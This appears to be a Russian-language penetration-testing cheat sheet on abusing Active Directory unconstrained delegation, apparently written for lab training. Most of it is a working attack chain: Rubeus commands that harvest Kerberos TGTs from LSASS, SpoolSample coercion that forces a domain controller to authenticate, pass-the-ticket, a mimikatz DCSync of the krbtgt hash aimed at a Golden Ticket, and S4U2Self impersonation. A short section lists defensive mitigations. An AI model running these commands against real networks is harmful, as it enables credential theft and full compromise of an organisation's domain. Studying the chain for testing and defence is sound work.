#AD #attacks #windows 

> При включенной неограниченной делегации на сервере сохраняется TGT пользователя. Злоумышленник, получивший доступ к серверу может извлечь его и использовать для доступа к другим сервисам

## 1) Ожидание аутентификации привилегированного пользователя

Поиск серверов с неограниченной делегацией
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

Мониторинга  TGT из LSASS на скомпрометированном сервере
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```
После подключения привилегированного пользователя к хосту мы получаем его TGT билет 

Перечислим группы, в которых этот пользователь состоит
```powershell
Import-Module .\PowerView.ps1
Get-DomainGroup -MemberIdentity <username>
```

Таким образом, мы будем использовать этот TGT для доступа к службе контроллера домена. Опция/флаг `/ptt` используется для передачи полученного билета в память, чтобы его можно было использовать для будущих запросов.
```powershell
.\Rubeus.exe asktgs /ticket:<b64ticket> /service:<SPN> /ptt
```

Если вдруг не получилось командой выше, перезапрашиваем TGT
```powershell
.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
```



# 2) Использование уязвимости принтера

> Хост с флагом `TRUSTED_FOR_DELEGATION` сохраняет копию TGT любого, кто на него аутентифицируется. Проблема — обычно никто привилегированный сам не заходит. PrinterBug решает это, **принудительно** заставляя целевую машину (DC) подключиться к скомпрометированному хосту.

### Предпосылки
- Скомпрометирован хост **X** с `TRUSTED_FOR_DELEGATION`
- Есть любые низкопривилегированные доменные креды (для coercion-запроса по MS-RPRN)
- На целевой машине **Y** (DC) включён Print Spooler

Поиск хостов с неограниченной делегацией
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

Мониторинг LSASS на скомпрометированном хосте X
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```


Принуждение через PrinterBug (coercion)
С непривилегированных кредов обращаемся к Print Spooler DC через MS-RPRN (`RpcRemoteFindFirstPrinterChangeNotificationEx`), заставляя DC подключиться к нашему X: 
Exploit: [SpoolSample POC](https://github.com/leechristensen/SpoolSample)
```powershell
SpoolSample.exe <target server> <capture server>
SpoolSample.exe DC01.domain.local X.domain.local
```

DC (`DC01$`) устанавливает обратное соединение к X и проходит Kerberos-аутентификацию. Поскольку тикет машинного аккаунта forwardable, а X помечен `TRUSTED_FOR_DELEGATION`, KDC прикладывает копию TGT `DC01$` — и она оседает в LSASS на X.

Захват TGT DC01$
Rubeus (шаг 2) ловит это событие и выводит тикет:
Импортируем полученный тикет в текущую сессию:
```powershell
.\Rubeus.exe ptt /ticket:<b64ticket> /nowrap
```

Если тикет истёк / не сработал — обновляем:
```powershell
.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt /nowrap
```

DCSync
`DC01$` обладает правами репликации (`Replicating Directory Changes` / `...All`). Используем это для дампа хэшей:
```powershell
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```

Результат — хэш `krbtgt` → возможность создать Golden Ticket → полный компромисс домена.


# Запрос TGT билета, зная хэш юзера
```powershell
.\Rubeus.exe asktgt /rc4:<NTHASH> /user:<username> /ptt
```

Теперь выдаем себя за этого юзера
```powershell
dir \\dc01.inlanefreight.local\c$
```


# Protect

1) Вместо **Unconstrained Delegation** использовать **Сonstrained Delegation**, а лучше **Resource-Based Constrained Delegation (RBCD)**
2) Добавляйте привилегированные учетные записи в группу **`Protected Users`**. Это запрещает делегирование для таких аккаунтов







# Если к аутентификации мы принуждаем не DC

Используем S4U2Self для получения TGS целевого сервиса и имперсонируемся под локального администратора 
```powershell
.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:<SPN> /ptt /ticket:<b64ticket>
```

Также выдаем себе за данного юзера
```powershell
ls \\dc01.inlanefreight.local\c$
```

